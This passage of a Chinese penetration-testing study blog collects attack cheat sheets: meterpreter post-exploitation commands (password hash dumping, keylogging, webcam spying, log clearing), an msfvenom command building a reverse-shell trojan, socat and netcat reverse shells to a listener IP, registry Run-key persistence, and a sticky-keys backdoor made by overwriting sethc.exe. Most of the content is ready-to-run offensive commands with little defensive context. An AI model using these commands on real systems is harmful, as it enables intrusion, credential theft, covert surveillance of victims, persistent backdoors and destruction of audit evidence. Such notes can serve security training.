<p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。attrib +s +a +h +r D:\test\project\test .txt。这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p>
<p>创建文件:fsutil file createnew  filename size</p>
</li>
</ul>
</blockquote>
<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><h5 id="两种session"><a href="#两种session" class="headerlink" title="两种session:"></a>两种session:</h5><p>​    Command shell session    –&gt; 就是cmd</p>
<p>​    meterpreter session            –&gt; 返回meterpreter</p>
<p>​                        </p>
<h5 id="指令"><a href="#指令" class="headerlink" title="指令:"></a>指令:</h5><p>​    jobs                                      查看工作</p>
<p>​    jobs -k id                           杀死只当的工作,-k kill</p>
<p>​    jobs -K                                 杀死所有的工作</p>
<p>​    session                                 查看连接到的会话</p>
<p>​    session -k id                        杀死指定的session</p>
<p>​    session -K                            杀死所有的session</p>
<p>​    run -j                                         放到后台监听</p>
<p>​    run -z                                        连接到了不会立马进入到交互模式</p>
<h5 id="meterpreter-1"><a href="#meterpreter-1" class="headerlink" title="meterpreter:"></a>meterpreter:</h5><p>​    getuid                                         查看当前用户</p>
<p>​    sysinfo                                        查看当前系统的基本信息</p>
<p>​    getpid                                         获取当前木马的pid</p>
<p>​    getsid                                         获取sid  </p>
<p>​    getsystem                                 获取管理员权限(初步提权,成功说明提权成功)</p>
<p>​    bg | background                    返回控制台</p>
<p>​    exit                                                退出当前session(关闭)</p>
<p>会话迁移: payload注入到新的进程当中,确保连接的稳定性</p>
<p>migrate    pid                                会话迁移</p>
<p>hashdump                                    下载sam文件中的账号密码信息</p>
<p>play                                                    播放.wav的文件</p>
<p>Webcam Commands:</p>
<p>webcam_stream                            查看摄像头(相当于监控)</p>
<p>webcam_list                                    列出有多少个摄像头</p>
<p>webcam_snap                                对摄像头做截屏</p>
<p>User interface Commands:</p>
<p>keyscan_dump                                下载键盘记录</p>
<p>keyscan_start                                    开启键盘监听</p>
<p>keyscan_stop                                    停止键盘监听</p>
<p>screenshare                                        看对方的电脑桌面(实时的,有延迟),以html文件的方式</p>
<p>run vnc                                                    看对方的电脑桌面(实时的,有延迟),以弹框的方式</p>
<p>screenshot                                            屏幕截图</p>
<p>uictl [enable/disable] [keyboard/mouse/all]    对键盘鼠标进行控制(禁用或者开启)</p>
<p><strong>clearev</strong>                    清除痕迹(系统日志,安全日志,应用日志)(前提有特权,才能清除的干净)</p>
<p>steal_token                                            身份盗用</p>
<p>rev2self                                                        返还身份</p>
<p> shutdown                                                关机</p>
<p><strong>shell</strong>                                                            进入到cmd或者进入到bash</p>
<p>kill    pid                                                    杀死进程</p>
<p>execute <code>-i -H  -f cmd</code>                            执行指令                </p>
<p>upload    local_file     remote_path                上传文件            </p>
<p>download remote_file local_path\save_filename                 下载文件</p>
<p>show_mount                                             磁盘信息</p>
<p>Core Commands:</p>
<p>background | bg                                    返回控制台</p>
<p>get_timeouts                                            获取session超时时间</p>
<p>linux:.elf,.sh</p>
<p>linux执行文件:</p>
<p>./ —&gt; 有可执行的权限,chmod u+x file —&gt; ./file</p>
<p>bash file</p>
<p>windows:bat,exe,hta</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckrvjdwc70001lwvj1zh2buu3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-MSF基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2021-07-18T08:42:26.000Z" itemprop="datePublished">2021-07-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/">MSF基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">warnning:</span><br><span class="line">msf数据库未开会显示警报,但是不影响使用,有需求可以开</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> postgresql        设置postgresql开机自启</span><br><span class="line">systemctl <span class="built_in">disable</span> postgresql    禁止开机自启</span><br><span class="line"></span><br><span class="line">systemctl:    </span><br><span class="line">        <span class="built_in">enable</span>    设置开机自启</span><br><span class="line">        <span class="built_in">disable</span>    禁止开机自启</span><br><span class="line">        start    运行服务</span><br><span class="line">        stop    停止服务</span><br><span class="line">        status    查看运行状态</span><br><span class="line">        restart    重启服务</span><br><span class="line">service:</span><br><span class="line">    service service_name 指令</span><br><span class="line">        start</span><br><span class="line">        stop    </span><br><span class="line">        stauts</span><br><span class="line">        restart            </span><br></pre></td></tr></table></figure>

<p><strong>!!!:指令可以用tab补全</strong></p>
<p>msfconsole        控制台</p>
<p>msfvenom         木马生成平台</p>
<p>exp: 攻击脚本</p>
<p>poc: 验证脚本</p>
<p>信息搜集 –&gt; 漏洞探测 –&gt; 漏洞利用 –&gt; 提权 –&gt; 横向渗透 –&gt; 植入后门 –&gt; 痕迹清除</p>
<p>​    [ metasploit v6.0.16-dev                          ]</p>
<ul>
<li>– –=[ 2073 exploits - 1124 auxiliary - 352 post       ]</li>
<li>– –=[ 596 payloads - 45 encoders - 10 nops            ]</li>
<li>– –=[ 7 evasion                                       ]</li>
</ul>
<p>exploits: 漏洞利用脚本</p>
<p>payloads: 攻击载荷</p>
<p>auxiliary: 辅助模块</p>
<p>post: 后渗透模块</p>
<p>encoders: 编码模块</p>
<p>nops: 空模块</p>
<p>evasion: 逃避模块</p>
<p><code>第一次运行msf需要初始化数据库,因为用到db_nmap需要用到数据库</code></p>
<p>msfdb init    初始化数据库</p>
<p>msfdb start    开启数据库</p>
<p>连接数据库:</p>
<ol>
<li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
</li>
<li><p>db_connect user:<a href="mailto:&#x70;&#97;&#115;&#115;&#x77;&#111;&#x72;&#x64;&#x40;&#49;&#50;&#x37;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;">&#x70;&#97;&#115;&#115;&#x77;&#111;&#x72;&#x64;&#x40;&#49;&#50;&#x37;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;</a>/database_name</p>
</li>
</ol>
<h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
<p>help     查看帮助信息</p>
<p>exit        退出当前的控制台</p>
<p>load      加载.rc的脚本</p>
<p>sessions    查看当前收到的会话</p>
<p>sessions -i id   进入会话</p>
<p>sessions -k id 杀死指定会话</p>
<p>sessions -K      杀死所有的会话  </p>
<p>bg | background   返回控制台</p>
<p>set          设置参数</p>
<p>setg         设置全局参数</p>
<p>unload    卸载脚本</p>
<p>unset        卸载参数</p>
<p>unsetg     卸载全局参数</p>
<p>info            显示模块的信息</p>
<p>options    显示参数的信息</p>
<p>search        搜索脚本</p>
<p>show            显示模块及参数信息</p>
<p>use                使用模块</p>
<p>run                运行辅助模块,跟exploit没有区别都可以用</p>
<p>exploit        运行攻击脚本</p>
<p>exploit | run -j   后台监听</p>
<p>run -z          持久化监听</p>
<p>run -j -z       后台持久监听</p>
<p>back            返回上一级</p>
<p>jobs            操作相关的工作</p>
<p>jobs -k id    删除指定任务</p>
<p>jobs -K        删除所有的任务</p>
<p>kill                杀死会话</p>
<h5 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom:"></a>msfvenom:</h5><p>-l,–list        列出相关的模块信息</p>
<p>-p,–payloads    指定payload</p>
<p>-e                指定编码模块</p>
<p>-f                指定输出格式</p>
<p>-a                指定架构(x86,x64)</p>
<p>-o                指定输出的文件</p>
<p>-b                bad Characters,坏字符,可以规避一些字符</p>
<p>-n                设置空模块</p>
<p>-i                    指定编码次数</p>
<p>-x                    指定模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">基操:</span><br><span class="line">常用payload:</span><br><span class="line">windows/x64/meterpreter/reverse_tcp windows/x64/meterpreter/reverse_tcp_rc4 windows/x64/meterpreter/bind_tc windows/x64/meterpreter/bind_tcp_rc4 windows/x64/meterpreter/reverse_https windows/x64/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">生成木马:</span><br><span class="line">-p指定的payload要与msfconsole指定的payload一致,不然无法监听到木马的反弹</span><br><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.135</span> lport=<span class="number">4444</span> -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">建立监听器:</span><br><span class="line">LHOST:设置本地监听的IP</span><br><span class="line">LPORT:设置本地监听的端口</span><br><span class="line">RHOSTS:设置远程IP</span><br><span class="line"></span><br><span class="line">stage: 传输器    --&gt; 存放paylaod的一个容器</span><br><span class="line">stager: 传输体     --&gt; 用来传输stage的一个通道</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler 设置渗透模块</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp 设置有效载荷</span><br><span class="line">set LHOST IP 设置本地接收ip</span><br><span class="line">set LPORT port 设置本地接收端口</span><br><span class="line">exploit | run 运行模块开始监听</span><br><span class="line"></span><br><span class="line">木马下放:</span><br><span class="line"><span class="number">1.</span> servic apache2 start</span><br><span class="line">    apache是web服务的一个中间件</span><br><span class="line">    默认路径: /var/www/html</span><br><span class="line">    访问方式: http://IP</span><br><span class="line">    注意事项: 可能会碰到默认页面,删除掉/var/www/html下的index.html文件即可</span><br><span class="line"><span class="number">2.</span> python2</span><br><span class="line">    用编程语言开放的服务器,服务器路径的话就是在当前目录下开放服务</span><br><span class="line">    python -m SimpleHTTPServer port</span><br><span class="line"><span class="number">3.</span> python3</span><br><span class="line">    python3 -m http.server port</span><br></pre></td></tr></table></figure>

<h4 id="linux的快捷键"><a href="#linux的快捷键" class="headerlink" title="linux的快捷键"></a>linux的快捷键</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ctrl+u    删除光标之前的内容</span><br><span class="line">ctrl+k    删除光标之后的内容</span><br><span class="line">ctrl+d  删除当前光标所在的内容</span><br><span class="line">ctrl+h    向前删除一个内容</span><br><span class="line">ctrl+a    跳到开头</span><br><span class="line">ctrl+e    跳到最后</span><br><span class="line">ctrl+r    搜索历史操作的指令,回车执行</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckrvjdwca0004lwvjbyy12clp" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Socat使用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" class="article-date">
  <time datetime="2021-07-16T07:44:39.000Z" itemprop="datePublished">2021-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/">Socat使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h5 id="建立监听器"><a href="#建立监听器" class="headerlink" title="建立监听器"></a>建立监听器</h5><p>socat -d -d tcp4-listen:port stdout                                     <code>--&gt; nc -lvvp</code></p>
<h5 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h5><p>socat - tcp4:ip:port                                                                    <code>     --&gt; nc ip port</code></p>
<h5 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h5><p>接收:</p>
<p>socat tcp4:ip:port file:filename,create</p>
<p>传输:</p>
<p>socat tcp4-listen:4444,fork file:filename</p>
<p><code>fork创建子进程,可以建立多个连接</code></p>
<p><strong>可以双向传输</strong></p>
<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>反向:</p>
<p>socat -d -d tcp4-listen:4444 stdout            建立监听</p>
<p>socat tcp4:192.168.1.135:4444 exec:/bin/bash            反弹shell</p>
<p>正向:</p>
<p>加密传输</p>
<p><strong>生成公钥和私钥</strong></p>
<p>openssl req -newkey rsa:2048 -nodes -keyout <code>bind.key</code> -x509 -days <code>365</code> -out <code>bind.crt</code>    </p>
<p><strong>把公钥和私钥转化为socat传输的格式</strong></p>
<p>cat bind.key bind.crt &gt; bind.pem            </p>
<p><strong>建立监听,并反弹shell</strong></p>
<p>socat openssl-listen:port,verify=0,cert=xxx.pem,fork exec:/bin/bash</p>
<p><strong>建立连接</strong></p>
<p>socat - openssl:ip:port,verify=0</p>
<p><code>!!!:verify=0 --&gt; 禁用ssl</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckrvjdwcc0006lwvj7bsjcpc6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
  <time datetime="2021-07-14T02:31:33.000Z" itemprop="datePublished">2021-07-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>1-存活主机</p>
<p>2-端口扫描</p>
<p>3-防火墙侦测</p>
<p>4-漏洞扫描</p>
<p>5-操作系统</p>
<p>banner:指的是指纹(版本信息、服务器(中间件)信息、开发商信息…)</p>
<p>nmap扫描结果的三种状态:</p>
<p>open(开放)</p>
<p>closed(关闭)</p>
<p>filtered(不确定是否开放)</p>
<h4 id="常用操作指令"><a href="#常用操作指令" class="headerlink" title="常用操作指令"></a><strong>常用操作指令</strong></h4><p>基本用法:nmap IP</p>
<p>-Pn:跳过主机存活判断,默认判断存活(推荐)</p>
<p>-sS：SYN扫描（隐匿） </p>
<p>-sV：探测打开的端口以确定服务/版本</p>
<p>-sSV=  -sS   -sV</p>
<p>-O:    操作系统的判断</p>
<p>-T:    扫描速度的设置(推荐T4)</p>
<p>-p:    指定端口扫描,-p 端口号 | -p- 全端口扫描 | -p0-65535|-p100-1000 | -p 80,445,3389</p>
<p>–script=脚本名</p>
<p>–script=模糊测试的脚本简写的名称</p>
<p>-sC：相当于–script=defaults</p>
<p>-oN: 标准输出</p>
<p>​    例如:-oN 1.txt</p>
<h4 id="NC-netcat"><a href="#NC-netcat" class="headerlink" title="NC(netcat)"></a>NC(netcat)</h4><p> 常用参数:</p>
<p> -c | -e: 执行命令或者程序,常用于反弹shell</p>
<p> -l:开启监听</p>
<p> -p:设定端口</p>
<p> -z:零输入输出,常用于端口开放检测,(连上立即断开)</p>
<p> -v -vv:详细信息|更详细的信息</p>
<p> -n:仅显示数字的ip地址,不显示DNS信息</p>
<p>创建监听:</p>
<p>nc -lp 指定端口号                监听端口</p>
<p>nc -lvvp 指定端口号            监听端口并显示详细的信息</p>
<p>nc -lnvp 指定端口号            监听端口并显示详细的信息</p>
<p>连接:</p>
<p>nc ip port</p>
<p>端口扫描:</p>
<p>nc -vz IP 端口号[单个端口,端口列表(80-1024)]</p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell:"></a>反弹shell:</h4><p>在linux中:</p>
<p> # –&gt; 特权用户(比如说 root)</p>
<p> $ –&gt; 普通用户</p>
<p>linux中默认的编码格式:utf8    占两个字符        </p>
<p>windows中默认的编码格式:gbk     占三个字符        </p>
<p>windows命令行切换utf8:chcp 65001</p>
<p>windows命令行切换gbk:chcp 936</p>
<p>lsof -i:port    查看指定端口开放情况</p>
<p>netstat -lutpn 查看端口开放情况</p>
<p>正向连接:指服务器主动反弹shell</p>
<p>​    以linux反弹shell为例:</p>
<p>​    服务端开启监听</p>
<p>​    nc -lvvp port -e /bin/bash</p>
<p>​    客户端连接</p>
<p>​    nc -v ip port </p>
<p>反向连接:指客户端主动反弹shell</p>
<p>​    以windows反弹shell为例:</p>
<p>​    服务端开启监听</p>
<p>​    nc -lvvp 4444</p>
<p>​    客户端反弹shell</p>
<p>​    nc ip port -e “c:\windows\system32\cmd.exe”</p>
<p>​    </p>
<p>​    linux会话提升:python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
<p>python -c “import pty;pty.spawn(‘/bin/bash’)”<br>                id</p>
<p>​                用户id=0(root) 组id=0(root) 组=0(root)</p>
<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>​    正向传输:</p>
<p>​    传输</p>
<p>​    -q 1 :传输完立马断开,不加就一直卡住</p>
<p>​    nc -lvvp port &lt; 1.txt -q 1</p>
<p>​    接收</p>
<p>​    nc ip port &gt; 2.txt</p>
<p>​    反向传输:</p>
<p>​    传输</p>
<p>​    nc ip port &lt; 1.txt -q 1</p>
<p>​    接收</p>
<p>​    nc -lvvp port &gt; 2.txt</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckrvjdwcj000clwvjhi9i0zav" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-注册表自启动和粘滞键后门" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" class="article-date">
  <time datetime="2021-07-12T03:13:16.000Z" itemprop="datePublished">2021-07-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">注册表自启动和粘滞键后门</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="注册表："><a href="#注册表：" class="headerlink" title="注册表："></a>注册表：</h4><p>​    数据类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REG_SZ：字符串：文本字符串</span><br><span class="line">REG_MULTI_SZ：多字符串值：含有多个文本值的字符串</span><br><span class="line">REG_BINARY：二进制数：二进制值，以十六进制显示，</span><br><span class="line">REG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值</span><br></pre></td></tr></table></figure>

<p>​    创建注册表：   regedit</p>
<p>自启动路径：</p>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RUN</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run &#x2F;v hh &#x2F;d &quot;calc.exe&quot; &#x2F;f</span><br><span class="line">reg add keyname ... 创建注册表</span><br><span class="line">&#x2F;v 注册表取名</span><br><span class="line">&#x2F;d 要执行的命令或者程序</span><br><span class="line">&#x2F;f 强制覆盖</span><br><span class="line"></span><br><span class="line">用户克隆</span><br><span class="line">注册表中sam文件下的administrator账户对应的目录文件中的F值覆盖掉普通用户对应目录的F值，权限会被继承</span><br></pre></td></tr></table></figure>

<p>自启动文件夹：win + R –&gt; shell:startup</p>
<p>​    C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
<p>服务配置：win + R –&gt;msconfig</p>
<p>UAC：user account control（用户账户控制）</p>
<p>​        最底下：默认以管理员权限运行</p>
<h4 id="粘滞键后门："><a href="#粘滞键后门：" class="headerlink" title="粘滞键后门："></a>粘滞键后门：</h4><p>​    原理：通过覆盖sethc.exe文件运行cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. takeown &#x2F;F c:\windwos\system32\* &#x2F;A &#x2F;R</span><br><span class="line"></span><br><span class="line">2.cacls c:\windwos\system32\\* &#x2F;T &#x2F;E &#x2F;G administrators:F</span><br><span class="line"></span><br><span class="line">3.copy cmd.exe sethc.exe</span><br><span class="line"></span><br><span class="line">4.连续按5次shift键呼出cmd</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckrvjdwcm000flwvjfsy8fzaf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/">linux后门植入</a>
          </li>
        
          <li>
            <a href="/2021/08/01/linux%E6%8F%90%E6%9D%83/">linux提权</a>
          </li>
        
          <li>
            <a href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">windows后门植入和linux信息搜集</a>
          </li>
        
          <li>
            <a href="/2021/07/26/windows%E6%8F%90%E6%9D%83/">windows提权</a>
          </li>
        
          <li>
            <a href="/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/">meterpreter与提权</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>